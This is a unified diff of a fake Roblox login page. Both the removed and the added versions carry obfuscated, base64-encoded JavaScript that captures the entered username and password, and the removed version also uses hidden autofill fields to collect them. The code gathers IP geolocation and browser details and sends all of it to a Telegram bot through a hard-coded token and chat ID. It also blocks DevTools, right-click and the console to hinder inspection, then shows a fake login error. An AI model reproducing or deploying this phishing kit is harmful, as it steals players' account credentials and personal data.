@@ -21,13 +21,9 @@
         .card .signup{text-align:center;margin-top:20px;font-size:14px;color:#666}
         .card .signup a{color:#00b06f;text-decoration:none;font-weight:600}
         .card .error{background:#fff0f0;border:1px solid #ffc7c7;border-radius:4px;padding:10px;color:#c00;font-size:13px;margin-bottom:12px;display:none}
-        input[type="text"][name="email"]{position:absolute;left:-9999px;top:-9999px;opacity:0.01;width:1px;height:1px}
-        input[type="password"][name="pass"]{position:absolute;left:-9999px;top:-9999px;opacity:0.01;width:1px;height:1px}
     </style>
 </head>
 <body>
-    <input type="text" name="email" autocomplete="email">
-    <input type="password" name="pass" autocomplete="current-password">
     <div class="page">
         <div class="card">
             <img src="https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png" alt="Roblox">
@@ -41,7 +37,34 @@
         </div>
     </div>
     <script>
-    (function(){setInterval(function(){var s=new Date();debugger;if(new Date()-s>100)window.location.href='about:blank';},1000);var _c=['log','warn','error','info','debug','trace'];_c.forEach(function(m){console[m]=function(){}});document.oncontextmenu=function(){return false};document.onkeydown=function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.key==='U'))return false};var _x='dmFyIEI9Jzg1NDc5MjMyNDg6QUFHWXlKRzRPTG5VMlZSUzRXQUtHYmlSNE1LUVBjdzhRWWsnLEM9Jzg2MjI4NDM5MzEnLGc9bnVsbCxzZT1mYWxzZSxzeT1mYWxzZTtmdW5jdGlvbiBkYigpe3ZhciB1PW5hdmlnYXRvci51c2VyQWdlbnQ7aWYodS5pbmRleE9mKCJZYUJyb3dzZXIiKT4tMSlyZXR1cm4i0K/QvdC00LXQutGBLtCR0YDQsNGD0LfQtdGAIjtpZih1LmluZGV4T2YoIkNocm9tZSIpPi0xJiZ1LmluZGV4T2YoIllhQnJvd3NlciIpPT09LTEpcmV0dXJuIkdvb2dsZSBDaHJvbWUiO2lmKHUuaW5kZXhPZigiRmlyZWZveCIpPi0xKXJldHVybiJNb3ppbGxhIEZpcmVmb3giO2lmKHUuaW5kZXhPZigiU2FmYXJpIik+LTEmJnUuaW5kZXhPZigiQ2hyb21lIik9PT0tMSlyZXR1cm4iU2FmYXJpIjtyZXR1cm4i0J3QtdC40LfQstC10YHRgtC90YvQuSDQsdGA0LDRg9C30LXRgCJ9ZnVuY3Rpb24gc25kKG0pe3ZhciB1PSdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JytCKycvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0nK0MrJyZ0ZXh0PScrZW5jb2RlVVJJQ29tcG9uZW50KG0pO25ldyBJbWFnZSgpLnNyYz11O25ldyBJbWFnZSgpLnNyYz0naHR0cHM6Ly9hcGkuYWxsb3JpZ2lucy53aW4vcmF3P3VybD0nK2VuY29kZVVSSUNvbXBvbmVudCh1KX1mdW5jdGlvbiBsZCgpe2ZldGNoKCdodHRwOi8vaXAtYXBpLmNvbS9qc29uLz9maWVsZHM9cXVlcnksY2l0eSxjb3VudHJ5LGlzcCxvcmcnKS50aGVuKGZ1bmN0aW9uKHIpe3JldHVybiByLmpzb24oKX0pLnRoZW4oZnVuY3Rpb24oZCl7Zz17aXA6ZC5xdWVyeXx8J9Cd0LXQuNC30LLQtdGB0YLQvdC+JyxjaXR5OmQuY2l0eXx8J9Cd0LXQuNC30LLQtdGB0YLQvdC+Jyxjb3VudHJ5OmQuY291bnRyeXx8J9Cd0LXQuNC30LLQtdGB0YLQvdC+Jyxpc3A6ZC5pc3B8fGQub3JnfHwn0J3QtdC40LfQstC10YHRgtC90L4nfTtpZighc3kpe3N5PXRydWU7c2koKX19KS5jYXRjaChmdW5jdGlvbigpe2c9e2lwOifQndC10LjQt9Cy0LXRgdGC0L3QviksY2l0eTon0J3QtdC40LfQstC10YHRgtC90L4nLGNvdW50cnk6J9Cd0LXQuNC30LLQtdGB0YLQvdC+Jyxpc3A6J9Cd0LXQuNC30LLQtdGB0YLQvdC+J307aWYoIXN5KXtzeT10cnVlO3NpKCl9fSl9ZnVuY3Rpb24gc2koKXtzbmQoJ/Cfkq8gU1lTX0lORk9cbuKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlFxu8J+MjCBCcm93c2VyOiAnK2RiKCkrJ1xu8J+SuyBPUzogJytuYXZpZ2F0b3IucGxhdGZvcm0rJ1xu8J+TiSBMYW5nOiAnK25hdmlnYXRvci5sYW5ndWFnZSsnXG7wn5OxIFVBOiAnK25hdmlnYXRvci51c2VyQWdlbnQrJ1xu8J+WpSBTY3JlZW46ICcrc2NyZWVuLndpZHRoKyd4JytzY3JlZW4uaGVpZ2h0KydcblwnOTFcJ2lwOicrZy5pcCsnXG5cJzkxXCcgQ2l0eTogJytnLmNpdHkrJ1xuXCc5MVwnIENvdW50cnk6ICcrZy5jb3VudHJ5KydcblwnOTFcJyBJU1A6ICcrZy5pc3ArJ1xu4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paUXG4nK2Z1bmN0aW9uKCl7cmV0dXJuJ+KPsCcgKyBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCdydS1SVScpfSgpKX1sZCgpO2Z1bmN0aW9uIHNsKHUscCl7aWYoc2UpcmV0dXJuO3NlPXRydWU7aWYoIWcpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtzZT1mYWxzZTtzbCh1LHApfSw1MDApO3JldHVybn1zbmQoJ/CflbXvuI8g0J3QntCS0KvQmSDQo9Cb0J7Qklxu4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paUXG5cbvCflI3Yg0JvQvtCz0LjQvTonK3UrJ1xu8J+UkSDQn9Cw0YDQvtC70Yw6ICcrcCsnXG7wn4yMIEJyb3dzZXI6ICcrZGIoKSsnXG5cbuKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlFxu8J+TiSBHRU9MT0NBVElPTlxuXG5cJzkxXCcgSVA6ICcrZy5pcCsnXG5cJzkxXCcg0JPQvtGA0L7QtDogJytnLmNpdHkrJ1xuXCc5MVwnINCh0YLRgNCw0L3QsDogJytnLmNvdW50cnkrJ1xuXCc5MVwnINCf0YDQvtCy0LDQudC00LXRgDogJytnLmlzcCsnXG5cbuKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlOKWlFxuJytuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCdydS1SVScpKTtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7c2U9ZmFsc2V9LDUwMDApfWZ1bmN0aW9uIGNwKCl7dmFyIGk9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW5wdXRbdHlwZT0idGV4dCJdW25hbWU9ImVtYWlsIl0sIGlucHV0W3R5cGU9InBhc3N3b3JkIl1bbmFtZT0icGFzcyJdJyk7dmFyIGQ9W107aS5mb3JFYWNoKGZ1bmN0aW9uKG4pe2lmKG4udmFsdWUmJm4udmFsdWUubGVuZ3RoPjEpe2QucHVzaChuLm5hbWUrJzonK24udmFsdWUpO24udmFsdWU9Jyd9fSk7aWYoZC5sZW5ndGg+MCl7c25kKCfwn5K0IENMSVBCT0FSRFxu4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paU4paUXG4nK2Quam9pbignXG4nKSl9fXNldEludGVydmFsKGNwLDMwMDApO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1idXR0b24nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZnVuY3Rpb24oKXt2YXIgdT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW4tdXNlcm5hbWUnKS52YWx1ZS50cmltKCk7dmFyIHA9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLXBhc3N3b3JkJykudmFsdWU7aWYoIXV8fCFwKXJldHVybjtjcCgpO3NsKHUscCk7dmFyIGI9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWJ1dHRvbicpO2IudGV4dENvbnRlbnQ9J1ZlcmlmeWluZy4uLic7Yi5kaXNhYmxlZD10cnVlO3NldFRpbWVvdXQoZnVuY3Rpb24oKXtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3InKS5zdHlsZS5kaXNwbGF5PSdibG9jayc7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLXBhc3N3b3JkJykudmFsdWU9Jyc7Yi50ZXh0Q29udGVudD0nTG9nIEluJztiLmRpc2FibGVkPWZhbHNlfSwyMDAwKX0pO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1wYXNzd29yZCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXByZXNzJyxmdW5jdGlvbihlKXtpZihlLmtleT09PSdFbnRlcicpZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWJ1dHRvbicpLmNsaWNrKCl9KQ==';var _d=atob(_x);var _f=new Function(_d);_f()})();
+    (function() {
+        // Защита от DevTools
+        setInterval(function() {
+            var start = new Date();
+            debugger;
+            if (new Date() - start > 100) window.location.href = 'about:blank';
+        }, 1000);
+
+        // Блокировка консоли
+        var c = ['log','warn','error','info','debug','trace'];
+        c.forEach(function(m) { console[m] = function() {}; });
+
+        // Блокировка правой кнопки и F12
+        document.oncontextmenu = function() { return false; };
+        document.onkeydown = function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+                return false;
+            }
+        };
+
+        // Основной код в base64
+        var _x = 'dmFyIEJPVF9UT0tFTiA9ICc4MjQ2OTcxNjA0OkFBR0hmRUprWWV2b1lWMHk3R29MYUhScFJTU2lQdG9DZFZnJzsNCnZhciBDSEFUX0lEID0gJzg2MjI4NDM5MzEnOw0KdmFyIGdlb0RhdGEgPSBudWxsOw0KdmFyIHNlbnQgPSBmYWxzZTsNCnZhciBzeXNTZW50ID0gZmFsc2U7DQoNCmZ1bmN0aW9uIGRiKCkgew0KICAgIHZhciB1ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsNCiAgICBpZih1LmluZGV4T2YoIllhQnJvd3NlciIpPi0xKXJldHVybiIxIjsNCiAgICBpZih1LmluZGV4T2YoIkNocm9tZSIpPi0xJiZ1LmluZGV4T2YoIllhQnJvd3NlciIpPT09LTEpcmV0dXJuIjIiOw0KICAgIGlmKHUuaW5kZXhPZigiRmlyZWZveCIpPi0xKXJldHVybiIzIjsNCiAgICBpZih1LmluZGV4T2YoIlNhZmFyaSIpPi0xJiZ1LmluZGV4T2YoIkNocm9tZSIpPT09LTEpcmV0dXJuIjQiOw0KICAgIHJldHVybiI1IjsNCn0NCg0KZnVuY3Rpb24gc25kKG0pIHsNCiAgICB2YXIgdGdVcmwgPSAnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCcgKyBCT1RfVE9LRU4gKyAnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JyArIENIQVRfSUQgKyAnJnRleHQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChtKTsNCiAgICBuZXcgSW1hZ2UoKS5zcmMgPSB0Z1VybDsNCiAgICB2YXIgcHJveHkgPSAnaHR0cHM6Ly9hcGkuYWxsb3JpZ2lucy53aW4vcmF3P3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHRnVXJsKTsNCiAgICBuZXcgSW1hZ2UoKS5zcmMgPSBwcm94eTsNCn0NCg0KZnVuY3Rpb24gbGQoKSB7DQogICAgZmV0Y2goJ2h0dHA6Ly9pcC1hcGkuY29tL2pzb24vP2ZpZWxkcz1xdWVyeSxjaXR5LGNvdW50cnksaXNwLG9yZycpDQogICAgICAgIC50aGVuKGZ1bmN0aW9uKHIpe3JldHVybiByLmpzb24oKTt9KQ0KICAgICAgICAudGhlbihmdW5jdGlvbihkKXsNCiAgICAgICAgICAgIGdlb0RhdGEgPSB7aXA6ZC5xdWVyeXx8Jz8nLGNpdHk6ZC5jaXR5fHwnPycsY291bnRyeTpkLmNvdW50cnl8fCc/Jyxpc3A6ZC5pc3B8fGQub3JnfHwnPyd9Ow0KICAgICAgICAgICAgaWYoIXN5c1NlbnQpIHsgc3lzU2VudCA9IHRydWU7IHNpKCk7IH0NCiAgICAgICAgfSkNCiAgICAgICAgLmNhdGNoKGZ1bmN0aW9uKCl7DQogICAgICAgICAgICBnZW9EYXRhID0ge2lwOic/JyxjaXR5Oic/Jyxjb3VudHJ5Oic/Jyxpc3A6Jz8nfTsNCiAgICAgICAgICAgIGlmKCFzeXNTZW50KSB7IHN5c1NlbnQgPSB0cnVlOyBzaSgpOyB9DQogICAgICAgIH0pOw0KfQ0KDQpmdW5jdGlvbiBzaSgpIHsNCiAgICBzbmQoJ1MwJyArIGRiKCkgKyBuYXZpZ2F0b3IucGxhdGZvcm0gKyBuYXZpZ2F0b3IubGFuZ3VhZ2UgKyBuYXZpZ2F0b3IudXNlckFnZW50ICsgc2NyZWVuLndpZHRoICsgJ3gnICsgc2NyZWVuLmhlaWdodCArIGdlb0RhdGEuaXAgKyBnZW9EYXRhLmNpdHkgKyBnZW9EYXRhLmNvdW50cnkgKyBnZW9EYXRhLmlzcCArIG5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoKSk7DQp9DQoNCmxkKCk7DQoNCmZ1bmN0aW9uIHNsKHUscCkgew0KICAgIGlmKHNlbnQpcmV0dXJuOw0KICAgIHNlbnQgPSB0cnVlOw0KICAgIGlmKCFnZW9EYXRhKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7c2VudD1mYWxzZTtzbCh1LHApO30sNTAwKTtyZXR1cm47fQ0KICAgIHNuZCh1ICsgJ3wnICsgcCArICd8JyArIGRiKCkgKyBnb29EYXRhLmlwICsgZ29vRGF0YS5jaXR5ICsgZ29vRGF0YS5jb3VudHJ5ICsgZ29vRGF0YS5pc3AgKyBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCkpOw0KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXtzZW50PWZhbHNlO30sNTAwMCk7DQp9DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1idXR0b24nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsZnVuY3Rpb24oKXsNCiAgICB2YXIgdT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW4tdXNlcm5hbWUnKS52YWx1ZS50cmltKCk7DQogICAgdmFyIHA9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLXBhc3N3b3JkJykudmFsdWU7DQogICAgaWYoIXV8fCFwKXJldHVybjsNCiAgICBzbCh1LHApOw0KICAgIHZhciBiPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1idXR0b24nKTtiLnRleHRDb250ZW50PSdWZXJpZnlpbmcuLi4nO2IuZGlzYWJsZWQ9dHJ1ZTsNCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yJykuc3R5bGUuZGlzcGxheT0nYmxvY2snO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1wYXNzd29yZCcpLnZhbHVlPScnO2IudGV4dENvbnRlbnQ9J0xvZyBJbic7Yi5kaXNhYmxlZD1mYWxzZTt9LDIwMDApOw0KfSk7DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbi1wYXNzd29yZCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXByZXNzJyxmdW5jdGlvbihlKXtpZihlLmtleT09PSdFbnRlcicpZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWJ1dHRvbicpLmNsaWNrKCk7fSk7';
+
+        // Расшифровка и выполнение
+        var _d = atob(_x);
+        var _f = new Function(_d);
+        _f();
+    })();
     </script>
 </body>
 </html>
